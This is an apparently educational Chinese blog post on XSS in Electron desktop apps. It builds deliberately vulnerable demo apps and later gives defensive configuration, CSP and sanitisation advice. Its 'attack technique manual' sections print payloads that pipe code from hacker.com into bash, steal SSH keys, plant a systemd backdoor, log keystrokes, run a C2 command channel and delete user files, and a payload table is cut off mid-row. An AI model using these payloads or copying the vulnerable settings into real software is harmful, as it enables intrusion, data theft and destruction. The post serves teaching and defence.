> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg5NjUxOTM3Mg==&mid=2247489787&idx=1&sn=c02f784dd91af29ccb3bf8f4701919b8

#  Electron XSS  
原创 一个努力的学渣  一个努力的学渣   2025-07-18 15:59  
  
免责声明  
  
本文只做学术研究使用，不可对真实未授权网站使用，如若非法他用，与平台和本文作者无关，需自行负责！  
  
什么是  
Electron   
  
Electron 是一个使用**Web 技术（HTML、CSS、JavaScript）构建跨平台桌面应用**  
的开源框架。它由 GitHub 开发并维护，结合了 Chromium（Web 渲染引擎）和 Node.js（服务器端 JavaScript 运行时），使开发者能用前端技术栈创建 Windows、macOS 和 Linux 原生应用  
  
图标：  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticK96TnBjk3ugaQFgIrEAUUGeA9yicrvcibvdhANibQKial2ziahzqFK0tpW5g/640?wx_fmt=png&from=appmsg "")  
  
  
  
Electron存在XSS漏洞的几率很低，除非修改默认代码/不使用默认的代码，一般只要研发不瞎搞，Electron基本不会存在XSS漏洞  
  
  
Electron 框架中的 XSS（跨站脚本攻击）因其结合了 Chromium 渲染引擎和 Node.js 运行时环境，可能导致远超传统 Web 应用的危害，包括本地文件读写、系统命令执行（RCE）等高危操作  
  
Electron 架构与 XSS 风险根源  
  
Electron 应用包含主进程（Node.js 环境）和渲染进程（Chromium + Node.js 混合环境）。其核心风险在于：  
- 渲染进程的 Node.js 访问权限  
- 若开启 nodeIntegration: true，渲染进程可直接调用 Node.js API（如 require('child_process')）  
- 核心问题：Electron 渲染进程默认融合了浏览器环境与 Node.js 能力，导致 XSS 可直接触发系统级操作（文件删除、恶意软件安装、数据窃取）  

```
<!-- 通过 XSS 注入恶意脚本 -->
<img src=x onerror=&#34;require('child_process').exec('calc.exe')&#34;>


// 一次成功的 XSS 攻击可导致：
require('child_process').exec('rm -rf /')  // 删除系统文件
require('electron').shell.openExternal('http://钓鱼网站') // 诱导用户输入
fs.readFile('/etc/passwd', (err, data) => { exfiltrate(data) }) // 窃取敏感文件
```

- 上下文隔离失效（contextIsolation: false）：未隔离时，渲染进程中的恶意脚本可访问预加载脚本（preload.js）暴露的 Node.js 接口，间接执行系统命令  
- 沙箱禁用（sandbox: false）：沙箱默认在 Electron 20+ 开启，但若同时启用 nodeIntegration 则沙箱自动关闭，导致系统权限暴露  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKgTYnjUKahthU6iboyChvpT39fPtNnLryRlk8U26sNbDIZWTMXRjhJIA/640?wx_fmt=png&from=appmsg "")  
  
前置环境准备  
  
需要先安装nodejs：  
https://nodejs.org/zh-cn/download  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKr47oppmp1IE2ib3wP5ATKbVC8US4mialG8ZddlRqzn34Yh79PNUjRBgg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKVoDtPCdicPf84HNQIrnpDvfPXh4SUVG9RzYSrG0Y8NCmrtsicnzhD0JA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKeFudwCicFf4noK3hHicFhbwfrYDLMqQTaXErxicYZAZFdgh3ovARoTZ5g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKrTk98188U7Ku4VujbVII4PY5ZPd3vTDN4OicBia6DjXicZwKUsG7f8lvQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKTUvwayicyWba8ceAkafZ3q7caHf1JVd5ekqJL3rjHtTviby7aAcdbcWQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKibwZVHziaf73TaCEphY7hgrw6SoicHzmVVIkGEKNFabnia802RJpqy16HQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticK5vrNcLkvUWufmcN5wtQjdM9RfMeDURn8OSMN63VpGTMIhj4bG9ye7Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKGrlBRR79Osd9dyJQS14fRK3xBzB64GO3BxGhGLnyZdxZXEsbrlZHFg/640?wx_fmt=png&from=appmsg "")  
  
搭建  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKia9WG0heU1hmcxbw14UkqSh1UVmiafco5yapS1iahrVDKNYu1FLdLmxFQ/640?wx_fmt=png&from=appmsg "")  
  
mkdir C:\Users\Z\vite-project\electron  
-  
xss  
-  
example  
  
cd C:\Users\Z\vite-project\electron  
-  
xss  
-  
example  
  
npm init   
-  
y  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKdKxKoyD4cgvuZvRhFePNglH0bfDSkZoiauxvjA0c7rU5yRQ7J9tfNcw/640?wx_fmt=png&from=appmsg "")  
  
安装修改：  
  
set http_proxy=http://127.0.0.1:9999  
  
set https_proxy=http://127.0.0.1:9999  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKl1BTictLUcbybWtcXaxd8icjd1ibibicZouDWB2uXnibNTibF1vSbxEYwXeTQ/640?wx_fmt=png&from=appmsg "")  
  
npm config set proxy   
http://127.0.0.1:9999  
  
npm config set https-proxy   
http://127.0.0.1:9999  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKuayv2saIkQiaF7cfr0F1dbv41sNT3SPb4oXHqOibOhpt0RXxRa6BxIWg/640?wx_fmt=png&from=appmsg "")  
  
npm install electron   
--  
save  
-  
dev  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticK1Pt2pfKCG2anQL5Ewooy8PK1WZEIYpsiaFCz8Ce8e5LoJrdAFIw8YFg/640?wx_fmt=png&from=appmsg "")  
  
清除缓存：npm cache clean --force  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKNnZGuHB82V4WmN8qPSJd2e6BQe5zAjXlKup83H1Ty6MISKXEqMRVjA/640?wx_fmt=png&from=appmsg "")  
  
设置淘宝镜像：npm config set registry   
https://registry.npmmirror.com  
  
使用 cnpm 代替 npm：  
  
npm install -g cnpm --registry=  
https://registry.npmmirror.com  
  
cnpm install electron --save-dev  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticK1XCpQICpjzeP071kTtbQasYPZNjOe28mg4lbzGGOt413GuDEeAs1jA/640?wx_fmt=png&from=appmsg "")  
  
演示环境一  
  
main  
.  
js 和 index  
.  
html 文件复制到项目根目录下  

```
// main.js
const { app, BrowserWindow } = require('electron');
const path = require('path');


function createWindow() {
    const win = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });


    win.loadFile('index.html');
}


app.whenReady().then(() => {
    createWindow();


    app.on('activate', function () {
        if (BrowserWindow.getAllWindows().length === 0) createWindow();
    });
});


app.on('window-all-closed', function () {
    if (process.platform !== 'darwin') app.quit();
});
```


```
<!-- index.html -->
<!DOCTYPE html>
<html>


<head>
    <meta charset=&#34;UTF-8&#34;>
    <title>Electron XSS Example</title>
</head>


<body>
<input type=&#34;text&#34; id=&#34;userInput&#34; placeholder=&#34;输入内容&#34;>
<button onclick=&#34;displayInput()&#34;>显示输入</button>
<div id=&#34;displayArea&#34;></div>
<script>
    function displayInput() {
        const input = document.getElementById('userInput').value;
        const displayArea = document.getElementById('displayArea');
        //displayArea.textContent=input;
        displayArea.innerHTML = input;
    }
</script>
</body>


</html>
```

  
配置  
package  
.  
json  

```
{
  &#34;name&#34;: &#34;electron-xss-example&#34;,
  &#34;version&#34;: &#34;1.0.0&#34;,
  &#34;description&#34;: &#34;&#34;,
  &#34;main&#34;: &#34;main.js&#34;,
  &#34;scripts&#34;: {
    &#34;start&#34;: &#34;electron .&#34;
  },
  &#34;keywords&#34;: [],
  &#34;author&#34;: &#34;&#34;,
  &#34;license&#34;: &#34;ISC&#34;,
  &#34;devDependencies&#34;: {
    &#34;electron&#34;: &#34;^23.2.1&#34;
  }
}
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKVfib64Eh3ePibUzianfrJStia2IlXVicxEwZX9TGdmq4HFgLMHOpG7dUxLQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKJDe4LaRMps1lUba7geKhEsuNbGWj5oj5rGP9JVJLpGM5ibtu2hRquVw/640?wx_fmt=png&from=appmsg "")  
  
启动：cnpm run start  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKiaO3gwIZ2vbf3rB3cuzmlDVLl9eVibY1QlvIIynJq7H9Dok44Q1XxEYA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKHvh4zfKIrrjITmyTdxQkDmXd31u0eEdlea6wpoictLMZYKFyEnb58Jw/640?wx_fmt=png&from=appmsg "")  
  
测试：  
<  
img src  
=  
"x"  
 onerror  
=  
"alert('XSS')"  
/>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKfFas4x7tsCMPOoibkhOelJUl70RibJLf4quazhxpFI0xL6TQmVN5Y0ww/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKL2IgnrZ5dmZXhLUesvPmAhCknZ8oaq8voyJGbCv4lfanxQGyYIS1PQ/640?wx_fmt=png&from=appmsg "")  
  
修复：使用 textContent 代替 innerHTML 来显示文本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKyHfr7gkFsSoKIibawSHExUiciaD3Z14SpSWdialJ1dtQoo3CRa1ebHDunQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKyqa2JuYrUzfF1y8q53icNHmsXw6ajvsIcwlT9WhVtyiaEoicHIYBlw2Pg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKEXngsew6FeGHZFLXLNNrnp7swt19RcjvBSWBo2gxup0yVT2IdqHiaeQ/640?wx_fmt=png&from=appmsg "")  
  
演示环境二  

```
//main.js
const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');


function createWindow() {
  // 危险配置：启用Node集成且禁用上下文隔离
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,      // 高危：允许Node.js访问
      contextIsolation: false,    // 高危：禁用上下文隔离
      sandbox: false              // 高危：禁用沙箱
    }
  });


  // 加载应用界面
  mainWindow.loadFile('index.html');


  // 危险IPC处理
  ipcMain.on('execute-command', (event, command) => {
    require('child_process').exec(command); // 直接执行系统命令
  });
}


app.whenReady().then(createWindow);
```


```
//index.html
<!DOCTYPE html>
<html>
<head>
  <meta charset=&#34;UTF-8&#34;>
  <title>Electron XSS漏洞演示</title>
  <style>
    * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    body { margin: 0; padding: 20px; background: #1a1a2e; color: #e6e6e6; }
    .container { max-width: 800px; margin: 0 auto; }
    .card { background: #16213e; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
    h1 { color: #4cc9f0; text-align: center; margin-bottom: 30px; }
    textarea, input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background: #0f3460; color: white; }
    button { background: #4cc9f0; color: #1a1a2e; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
    button:hover { background: #2fb1e0; transform: translateY(-2px); }
    #preview { min-height: 150px; background: #0f3460; padding: 15px; border-radius: 5px; margin-top: 15px; }
    .section-title { color: #4cc9f0; border-bottom: 2px solid #4cc9f0; padding-bottom: 10px; margin-top: 25px; }
    .warning { background: #f05454; padding: 15px; border-radius: 5px; margin: 20px 0; font-weight: bold; }
  </style>
</head>
<body>
  <div class=&#34;container&#34;>
    <h1>Electron XSS漏洞演示</h1>


    <div class=&#34;warning&#34;>
      警告：此应用包含已知安全漏洞，仅用于演示目的！
    </div>


    <div class=&#34;card&#34;>
      <h2 class=&#34;section-title&#34;>用户评论系统</h2>
      <textarea id=&#34;comment&#34; placeholder=&#34;输入您的评论...&#34; rows=&#34;4&#34;></textarea>
      <button onclick=&#34;postComment()&#34;>提交评论</button>


      <div id=&#34;preview&#34;>
        <h3>评论预览：</h3>
        <div id=&#34;comment-preview&#34;></div>
      </div>
    </div>


    <div class=&#34;card&#34;>
      <h2 class=&#34;section-title&#34;>系统命令执行</h2>
      <input type=&#34;text&#34; id=&#34;command&#34; placeholder=&#34;输入系统命令&#34;>
      <button onclick=&#34;executeCommand()&#34;>执行命令</button>
      <div id=&#34;command-result&#34;></div>
    </div>
  </div>


  <script>
    // 危险：直接渲染用户输入
    function postComment() {
      const comment = document.getElementById('comment').value;
      document.getElementById('comment-preview').innerHTML = comment;
    }


    // 危险：直接执行系统命令
    function executeCommand() {
      const command = document.getElementById('command').value;
      const { ipcRenderer } = require('electron');
      ipcRenderer.send('execute-command', command);
      document.getElementById('command-result').innerText = `已执行命令: ${command}`;
    }


    // 模拟用户评论加载（实际应用中可能从数据库加载）
    window.onload = () => {
      // 模拟来自数据库的评论（可能包含恶意内容）
      const maliciousComment = `<img src=&#34;x&#34; onerror=&#34;alert('来自数据库的XSS攻击!')&#34;>`;
      document.getElementById('comment-preview').innerHTML = maliciousComment;
    };
  </script>
</body>
</html>
```


```
//package.json
{
  &#34;name&#34;: &#34;electron-xss-demo&#34;,
  &#34;version&#34;: &#34;1.0.0&#34;,
  &#34;main&#34;: &#34;main.js&#34;,
  &#34;scripts&#34;: {
    &#34;start&#34;: &#34;electron .&#34;
  },
  &#34;dependencies&#34;: {
    &#34;electron&#34;: &#34;^25.0.0&#34;
  }
}
```

  
启动：  
cnpm rum start  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKhGqHA7XZiaHrILGlb0Ks9rc5t3IzMVp3tK8zGMkqfPkfm0qKFqEibWeQ/640?wx_fmt=png&from=appmsg "")  
  
攻击场景一：基本XSS攻击  

```
在用户评论框中输入恶意代码：<img src=&#34;x&#34; onerror=&#34;alert('XSS攻击成功!')&#34;>
点击&#34;评论提交&#34;，触发弹窗
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKe8B4SLP0hRXd0psxQhrbwVHwgUzc67wQxlt2D4hexNG3LA85vAQsag/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKAQnicQD2EDCX6ibacWx9DibLLsVm8N0r1mg2JOXuCMYjUwqB6e3D5vlhA/640?wx_fmt=png&from=appmsg "")  
  
攻击场景二：远程代码执行(RCE)  

```
在命令执行框中输入恶意命令：
# Windows
calc.exe && echo &#34;系统被入侵&#34; > C:\hacked.txt


# macOS/Linux
open -a Calculator && echo &#34;系统被入侵&#34; > ~/hacked.txt


点击&#34;执行命令&#34;，系统将启动计算器并创建被入侵标记文件
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticKeS64G7oyfVmHzfD5bZuFdILtzG24D5X1uo4RlTiaMEzicBKA7oYZT7aA/640?wx_fmt=png&from=appmsg "")  
  
攻击场景三：组合攻击(通过评论触发 RCE)  

```
构造恶意评论执行系统命令：
<img src=x onerror=&#34;require('child_process').exec('calc.exe')&#34;>
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4Rywy3tq6Qfj2OZhOQJVvticK5m1M5Uu1rtibbAYn3hwdlW2qqDNSnOwn4YLjLXvTQ1icN18JZjzqA5iag/640?wx_fmt=png&from=appmsg "")  
  
漏洞原理分析：  
  
1.危险配置  

```
webPreferences: {
  nodeIntegration: true,   // 允许渲染进程直接访问Node.js
  contextIsolation: false, // 禁用上下文隔离
  sandbox: false           // 禁用沙箱
}
```

  
这些配置使得渲染进程可以完全访问Node.js环境  
  
2.不安全的HTML渲染  

```
document.getElementById('comment-preview').innerHTML = comment;
```

  
直接使用innerHTML插入未过滤的用户输入，导致XSS漏洞  
  
3.不安全的IPC通信  

```
ipcMain.on('execute-command', (event, command) => {
  require('child_process').exec(command);
});
```

  
主进程直接执行渲染进程发送的命令，没有任何验证  
### 高危漏洞场景  
#### 致命配置错误（90% 漏洞根源）  

```
// 灾难性配置 - 禁用所有安全机制
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,   // 允许直接访问 Node.js
    contextIsolation: false, // 禁用上下文隔离
    sandbox: false,          // 禁用沙箱
    webSecurity: false       // 禁用同源策略
  }
})
```


```
//攻击效果：
<script>
  // 删除用户所有文档
  require('fs').rmdirSync(require('os').homedir(), { recursive: true });


  // 安装勒索软件
  require('child_process').exec('curl http://hacker.com/ransomware | bash');
</script>
```

<table><tbody><tr><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">配置项</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">危险值</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">安全值</span></span></p></td><td data-colwidth="189" width="189" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">风险后果</span></span></p></td></tr><tr><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">nodeIntegration</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">true</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">false</span></span></p></td><td data-colwidth="189" width="189" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">渲染进程直接访问</span></span></p></td></tr><tr><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">contextIsolation</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">false</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">true</span></span></p></td><td data-colwidth="189" width="189" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">恶意脚本污染预加载接口</span></span></p></td></tr><tr><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">sandbox</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">false </span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">true</span></span></p></td><td data-colwidth="189" width="189" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">禁用 Chromium 沙箱保护</span></span></p></td></tr><tr><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">webSecurity</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">false</span></span></p></td><td data-colwidth="187" width="187" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">true</span></span></p></td><td data-colwidth="189" width="189" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">允许加载不安全内容（如 file://*） </span></span></p></td></tr></tbody></table>#####   
##### 直接 Node 命令执行（nodeIntegration: true）  

```
<!-- 注入点：用户输入渲染处 -->
<div>{{userContent}}</div>
```


```
攻击者输入：<img src=x onerror=&#34;require('child_process').exec('calc.exe')&#34;>
```

##### 通过预加载脚本绕过隔离（contextIsolation: false）  

```
假设预加载脚本暴露接口：
// preload.js
window.api = { 
  readFile: (path) => fs.readFileSync(path) 
}
```


```
攻击者利用 XSS 执行：
// 窃取系统文件
const data = window.api.readFile('/etc/passwd');
fetch('http://hacker.com/steal', { method: 'POST', body: data })
```

##### DOM 型 XSS + file:// 协议利用  

```
// 漏洞代码：基于 URL 参数动态创建元素
const html = `<a href=&#34;${location.hash.slice(1)}&#34;>点击</a>`;
document.body.innerHTML = html;
```


```
攻击者构造链接：file://app/index.html#javascript:require('child_process').exec('rm -rf ~/Documents')
结果：用户点击后删除整个文档目录
```

#### IPC 通信漏洞链  

```
// 主进程 (危险IPC处理)
ipcMain.on('exec-command', (event, cmd) => {
  require('child_process').exec(cmd); // 直接执行系统命令
});


// 渲染进程 (通过XSS触发)
document.write(`<img src=x onerror=&#34;
  window.api.send('exec-command', 'rm -rf ~/Documents')
&#34;>`);
```

#### 协议处理器路径遍历  

```
// 自定义协议漏洞
protocol.registerFileProtocol('app', (request, callback) => {
  callback({ path: request.url.substring(7) }); // 未过滤路径
});
```


```
攻击效果：<iframe src=&#34;app:///../../etc/passwd&#34;></iframe>
```

#### Webview 沙箱逃逸  

```
<!-- 危险 Webview 配置 -->
<webview 
  src=&#34;https://external.com&#34;
  nodeintegration
  allowpopups
  webpreferences=&#34;contextIsolation=no&#34;
></webview>
```

  
攻击路径：外部页面 → 通过 require('child_process') 执行系统命令  
### Electron 专属攻击技术手册  
#### Node.js 模块武器化  

```
// 文件窃取
const data = require('fs').readFileSync('/.ssh/id_rsa');
new Image().src = `http://hacker.com/steal?data=${btoa(data)}`;


// 持久化后门
require('fs').writeFileSync(
  `${require('os').homedir()}/.config/systemd/user/backdoor.service`,
  `[Service]\nExecStart=/bin/bash -c &#34;while true; do curl http://hacker.com/shell | bash; done&#34;`
);


// 键盘记录器
require('iohook').on('keydown', e => {
  fetch('http://hacker.com/log', { method: 'POST', body: e.key });
});
```

#### 组合攻击链  

```
// 阶段1：通过XSS获取Node访问权
<img src=x onerror=&#34;
  const { net } = require('electron');


  // 阶段2：建立加密C2通道
  const socket = net.connect(443, 'c2.hacker.com', () => {
    socket.write(Buffer.from('CONNECTED|' + navigator.userAgent).toString('base64'));
  });


  // 阶段3：接收并执行指令
  socket.on('data', data => {
    const cmd = Buffer.from(data, 'base64').toString();
    require('child_process').exec(cmd, (e, out) => {
      socket.write(Buffer.from(out).toString('base64'));
    });
  });
&#34;>
```

### Electron XSS全面防御  
#### 安全配置黄金法则  

```
new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,   // 必须禁用
    contextIsolation: true,   // 必须启用 (Electron 12+ 默认)
    sandbox: true,            // 启用沙箱 (Electron 20+ 默认)
    preload: path.join(__dirname, 'preload.js'), // 唯一安全通道
    webSecurity: true,        // 启用同源策略
    enableRemoteModule: false // 禁用远程模块
  }
})
```

#### 安全的预加载脚本架构  

```
// preload.js - 安全IPC桥梁
const { contextBridge, ipcRenderer } = require('electron');


contextBridge.exposeInMainWorld('safeAPI', {
  readFile: (path) => ipcRenderer.invoke('read-file', path),
  writeFile: (path, data) => ipcRenderer.invoke('write-file', path, data)
});


// main.js - 主进程验证器
ipcMain.handle('read-file', async (event, path) => {
  // 1. 发送方验证
  if (event.senderFrame !== mainWindow.webContents.mainFrame) return;


  // 2. 路径白名单校验
  const allowedPaths = [
    app.getPath('userData'),
    app.getPath('documents') + '/allowed_dir'
  ];


  if (!allowedPaths.some(p => path.startsWith(p))) {
    throw new Error('非法文件路径');
  }


  // 3. 返回内容
  return fs.promises.readFile(path);
});
```

#### 终极内容安全策略 (CSP)  

```
<meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;
  default-src 'none';
  script-src 'self' 'nonce-random123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  object-src 'none';
  base-uri 'none';
  form-action 'none';
  frame-ancestors 'none';
  require-trusted-types-for 'script';
  trusted-types dompurify;
&#34;>
```

#### 动态内容安全处理  

```
// 使用DOMPurify的强化配置
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);


const sanitizeConfig = {
  ALLOWED_TAGS: ['p', 'h1', 'h2', 'ul', 'li', 'a'],
  ALLOWED_ATTR: ['href', 'class', 'target'],
  FORBID_ATTR: ['style', 'on*'],
  ALLOW_DATA_ATTR: false,
  ALLOWED_URI_REGEXP: /^(https?|mailto|tel):/i,
  RETURN_TRUSTED_TYPE: true,
  ADD_ATTR: ['rel'] // 强制添加 rel='noopener'
};


DOMPurify.addHook('afterSanitizeAttributes', node => {
  if (node.tagName === 'A') {
    node.setAttribute('rel', 'noopener noreferrer');
  }
});


const clean = DOMPurify.sanitize(untrustedHTML, sanitizeConfig);
```

#### 漏洞挖掘  
<table><tbody><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">漏洞类型    </span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">特征</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">测试Payload</span></span></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">直接Node执行 </span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">nodeIntegration: true</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">&lt;img src=x onerror=&#34;require(&#39;child_process&#39;).exec(&#39;calc.exe&#39;)&#34;&gt;</span></span></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">IPC命令注入</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">IPC调用</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">exec/system ipcRenderer.send(&#39;exec&#39;,&#39;touch /tmp/pwned&#39;)</span></span></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">协议路径遍历</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">未过滤的自定义协议</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">&lt;iframe src=&#34;app://../../etc/passwd&#34;&gt;</span></span></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">Webview逃逸</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">Webview启用Node</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">&lt;webview&gt;.executeJavaScript(&#34;require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;)&#34;)</span></span></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span 